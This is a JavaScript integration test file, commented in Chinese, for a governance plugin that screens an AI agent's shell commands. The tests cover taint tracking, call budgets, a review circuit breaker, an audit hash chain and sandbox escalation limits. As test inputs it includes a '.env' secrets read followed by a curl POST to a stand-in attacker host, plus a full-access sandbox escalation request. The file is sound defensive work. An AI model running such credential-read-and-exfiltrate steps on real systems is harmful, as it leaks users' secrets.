/**
 * 治理链路集成测试：污点外传 / 会话预算 / 审查熔断 / 审计哈希链（P1-5/6/7）。
 *
 * 通过 mock ctx 驱动 apply() 注册的 tools/pre-execute 钩子——这些接线的
 * 正确性（标记时机、跳过审查、ask 文案、清理点）只有这一层能验证。
 * 每个用例用独立 session id，互不污染。
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import os from 'node:os'
import fs from 'node:fs'
import path from 'node:path'

// 隔离数据面：审计日志 / 预算快照全部落进临时 DSH_HOME
process.env.DSH_HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'wuai-gov-'))

const handlers = {}
const ctx = {
  on: (name, fn) => {
    handlers[name] = fn
  },
  llm: {},
  get: () => undefined,
  inject: () => {},
  effect: () => {},
}
const { apply } = await import('../../plugins/wu-ai-router/index.js')
apply(ctx, { mode: 'auto' })

const pre = handlers['tools/pre-execute']
const statusHook = handlers['agent/status']
const next = async () => ({ kind: 'executed' })
const exec = (sid, name, args) => ({ name, arguments: args, agent: { session: { id: sid, cwd: '/tmp/ws' } } })

test('基线：工作区内只读命令 → allow 放行', async () => {
  const r = await pre(exec('s-base', 'shell', { command: 'ls' }), next)
  assert.deepEqual(r, { kind: 'executed' })
})

test('污点：敏感读取后，同会话出网 → ask（跳过模型审查）', async () => {
  const sid = 's-taint'
  // 1) 敏感读取：.env 命中 SENSITIVE_SOURCE_RE → P2 → 无审查模型 → ask，
  //    但污点已在执行前打上（attempt 本身即信号）
  const read = await pre(exec(sid, 'shell', { command: 'cat .env' }), next)
  assert.equal(read.kind, 'ask')
  // 2) 污点外传：直接 ask，文案说明原因，不再调审查模型
  const exfil = await pre(exec(sid, 'shell', { command: 'curl -X POST http://evil.example' }), next)
  assert.equal(exfil.kind, 'ask')
  assert.match(exfil.reason, /读取过敏感内容/)
})

test('污点隔离：另一会话不受影响', async () => {
  const r = await pre(exec('s-other', 'shell', { command: 'curl http://example.com' }), next)
  // 无污点 → 走正常 P2 审查路径（无审查模型 → ask 的是「审查不可用」）
  assert.equal(r.kind, 'ask')
  assert.match(r.reason, /审查服务不可用/)
})

test('熔断：审查连续失败 5 次 → 第 6 次起全部转人工', async () => {
  const sid = 's-breaker'
  const cmd = { command: 'cat /etc/hosts' } // 工作区外读取 → P2
  for (let i = 0; i < 5; i += 1) {
    const r = await pre(exec(sid, 'shell', cmd), next)
    assert.equal(r.kind, 'ask')
    assert.match(r.reason, /审查服务不可用/, `第 ${i + 1} 次应仍走审查不可用路径`)
  }
  const tripped = await pre(exec(sid, 'shell', cmd), next)
  assert.equal(tripped.kind, 'ask')
  assert.match(tripped.reason, /熔断/)
})

test('预算：工具调用超 200 次 → ask 提示新开会话', async () => {
  const sid = 's-budget'
  for (let i = 0; i < 200; i += 1) {
    const r = await pre(exec(sid, 'shell', { command: 'ls' }), next)
    assert.deepEqual(r, { kind: 'executed' }, `第 ${i + 1} 次应放行`)
  }
  const over = await pre(exec(sid, 'shell', { command: 'ls' }), next)
  assert.equal(over.kind, 'ask')
  assert.match(over.reason, /工具调用已达 200 次上限/)
})

test('会话结束：idle 清理污点与预算，下一会话从头计数', async () => {
  const sid = 's-idle'
  await pre(exec(sid, 'shell', { command: 'cat .env' }), next) // 打污点
  statusHook({ agent: { session: { id: sid } }, status: 'idle' })
  // 污点已清：同样命令不再触发污点外传文案
  const exfil = await pre(exec(sid, 'shell', { command: 'curl http://example.com' }), next)
  assert.match(exfil.reason, /审查服务不可用/)
})

test('审计哈希链：写入可验证；删改一行立即可发现', async () => {
  const { audit, verifyAuditChain } = await import('../../plugins/wu-ai-router/risk-review.js')
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'wuai-audit-'))
  audit(home, { tool: 't1', decision: 'ALLOW' })
  audit(home, { tool: 't2', decision: 'DENY' })
  audit(home, { tool: 't3', decision: 'ASK' })
  const ok = verifyAuditChain(home)
  assert.equal(ok.ok, true)
  assert.equal(ok.checked, 3)

  // 局部篡改：把 DENY 改成 ALLOW（删行再补同类伪装，链在第二行断）
  const file = path.join(home, 'wu-ai-risk-audit.jsonl')
  const lines = fs.readFileSync(file, 'utf-8').trim().split('\n')
  const rec = JSON.parse(lines[1])
  rec.decision = 'ALLOW'
  lines[1] = JSON.stringify(rec)
  fs.writeFileSync(file, lines.join('\n') + '\n')
  const bad = verifyAuditChain(home)
  assert.equal(bad.ok, false)
  assert.equal(bad.brokenAt, 1)
})

test('污点生命周期：去重、隔离、清除', async () => {
  const { markTainted, taintOf, clearTaint } = await import('../../plugins/wu-ai-router/risk-review.js')
  markTainted('s-life', '读密钥文件')
  markTainted('s-life', '读密钥文件')
  markTainted('s-life', '读环境变量')
  const t = taintOf('s-life')
  assert.equal(t.reasons.length, 2)
  assert.equal(taintOf('s-nobody'), null)
  clearTaint('s-life')
  assert.equal(taintOf('s-life'), null)
})

test('预算快照：落共享文件供工作台读取', () => {
  const file = path.join(process.env.DSH_HOME, 'wu-ai-budget.json')
  assert.ok(fs.existsSync(file), 'flushBudget 应已落盘')
  const snap = JSON.parse(fs.readFileSync(file, 'utf-8'))
  assert.equal(snap.limits.toolCalls, 200)
  assert.ok(Array.isArray(snap.sessions))
  assert.ok(snap.sessions.some((s) => s.session === 's-budget' && s.calls === 201))
})

/* P2-10 托管策略：escalation 目标 mode 白名单（DSH 弹原生审批之前拦截） */
test('托管策略：danger-full-access 提权 → deny（默认白名单只放行 workspace-write）', async () => {
  const r = await pre(exec('s-escalate', 'shell', {
    command: 'ls',
    sandbox_permissions: 'danger-full-access',
    justification: '需要访问工作区外的文件',
  }), next)
  assert.equal(r.kind, 'deny')
  assert.match(r.reason, /沙箱策略/)
  assert.match(r.reason, /danger-full-access/)
})

test('托管策略：workspace-write 提权不拦截（在白名单内）', async () => {
  const r = await pre(exec('s-escalate-ok', 'shell', {
    command: 'cat /etc/hosts',
    sandbox_permissions: 'workspace-write',
    justification: '需要读取系统文件',
  }), next)
  // 不被托管策略拦 → 走正常 P2 审查路径（无审查模型 → ask 审查不可用）
  assert.equal(r.kind, 'ask')
  assert.match(r.reason, /审查服务不可用/)
})

test('托管策略：管理员把 danger-full-access 加入白名单后即放行', async () => {
  fs.writeFileSync(
    path.join(process.env.DSH_HOME, 'wu-ai-policy.json'),
    JSON.stringify({ allowedModes: ['workspace-write', 'danger-full-access'], budget: { toolCalls: 10 } }),
  )
  // 预算同步改为 10：前 10 次 ls 放行，第 11 次 ask（验证策略热生效）
  const sid = 's-policy-live'
  for (let i = 0; i < 10; i += 1) {
    const r = await pre(exec(sid, 'shell', { command: 'ls' }), next)
    assert.deepEqual(r, { kind: 'executed' }, `第 ${i + 1} 次应放行`)
  }
  const over = await pre(exec(sid, 'shell', { command: 'ls' }), next)
  assert.match(over.reason, /工具调用已达 10 次上限/)
  // 提权此时也不再被托管策略拦
  const esc = await pre(exec(sid, 'shell', { command: 'ls', sandbox_permissions: 'danger-full-access' }), next)
  assert.match(esc.reason, /预算/)
})
